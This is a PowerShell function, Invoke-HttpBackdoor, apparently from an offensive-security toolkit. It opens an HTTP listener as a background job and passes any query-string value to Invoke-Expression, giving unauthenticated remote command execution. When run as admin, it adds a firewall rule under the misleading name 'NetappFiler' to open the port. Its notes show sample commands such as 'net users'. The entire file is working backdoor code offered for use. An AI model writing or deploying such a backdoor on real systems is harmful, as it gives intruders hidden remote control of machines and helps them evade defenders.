Function Invoke-HttpBackdoor {
<#
.NAME
   Invoke-HttpBackdoor

.SYNOPSIS
 
    Invoke-HttpBackdoor
    
    Author: Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    
.DESCRIPTION

    This function creates an HTTP backdoor on a specified port as a background job.
   
.LINK

    http://www.obscuresec.com/
    http://ps1.soapyfrog.com/wp-content/uploads/2007/01/httpdps1.txt

.NOTES
    
    To send the HttpBackdoor commands:
        http://backdoorhost/?api/settings/session=ipconfig
        http://backdoorhost/?api/settings/session=net%20users
#>
    [CmdletBinding()] Param (
        [Parameter(Position = 0)]
        [ValidateRange(1,65535)]
        [Int32]
        $Port = '8888'
    )
    
    $Initializer = {
        Function HttpBackdoor {
            $ListenPort = "REPLACEME0"
            $DirectoryString = 'api/settings/session'
          
            $HttpListenerObject = New-Object Net.HttpListener
            $ObjectPrefix = "http://*:$ListenPort/"
            
            Foreach ($Object in $ObjectPrefix) {
                $HttpListenerObject.Prefixes.Add($Object)
            }
            
            $HttpListenerObject.Start()

            $Continue = $True

            While ($Continue) {
              $ListenerContext = $HttpListenerObject.GetContext()
              $HttpResponse = $ListenerContext.Response
              $HttpResponse.Headers.Add("Content-Type","text/plain")
              $StreamWriterObject = New-Object IO.StreamWriter($HttpResponse.OutputStream,[Text.Encoding]::UTF8)
              $HttpRequest = $ListenerContext.Request  
              [string] $HttpParameter = $HttpRequest.QueryString[$DirectoryString]
          
              Switch ($HttpParameter) {
                "logout" {$Continue = $False; Break}
                $null {$StreamWriterObject.WriteLine("HTTP Error 403: Forbidden"); Break}
                Default {
                   $Count = 0
                   Invoke-Expression $HttpParameter | Out-String -Stream | foreach {
                         $StreamWriterObject.WriteLine($_.TrimEnd())
                         $Count++
                      }

                  If ($Count -eq 0) {$StreamWriterObject.WriteLine('HTTP Error 404: Not Found')}
                }
              }
          
              $StreamWriterObject.Close()

            }
            $HttpListenerObject.Stop()
        }
    }
        
        Try {
            #Check if Firewall is on
            $FirewallStatus = (New-Object -com HNetCfg.FwMgr).localpolicy.CurrentProfile.FirewallEnabled

            #Check for admin rights
            $AdminStatus = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

            #Firewall no admin rights
            If (($FirewallStatus -eq $True) -and ($AdminStatus -eq $False)) {
                Write-Error "Not running as admin and the firewall is on. Run with elevated credentials"
                Return
            }

            #Firewall with admin rights, open port
            If (($FirewallStatus -eq $True) -and ($AdminStatus -eq $True)) {   
                $FirewallPolicyObject = New-Object -ComObject hnetcfg.fwpolicy2 
                $FirewallRuleObject = New-Object -ComObject HNetCfg.FWRule
                $FirewallRuleObject.Name = 'NetappFiler'
                $FirewallRuleObject.Protocol = 6 
                $FirewallRuleObject.LocalPorts = $LocalPort
                $FirewallRuleObject.Enabled = $true
                $FirewallRuleObject.Profiles = 7 
                $FirewallRuleObject.Action = 1
                $FirewallPolicyObject.Rules.Add($FirewallRuleObject)
            }

            #Check if port is alread used
            $ListeningPorts = ([System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpListeners()).port
            If ($ListeningPorts -contains $Port) {
                Write-Error "Port is already in use!"
                Return
            }

            $ScriptBlock = [ScriptBlock]::Create(($Initializer -replace 'REPLACEME0', $Port))
            Start-job -InitializationScript $ScriptBlock -ScriptBlock {HttpBackdoor} | Out-Null
        }

        Catch {
            Write-Error $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
        } 
}
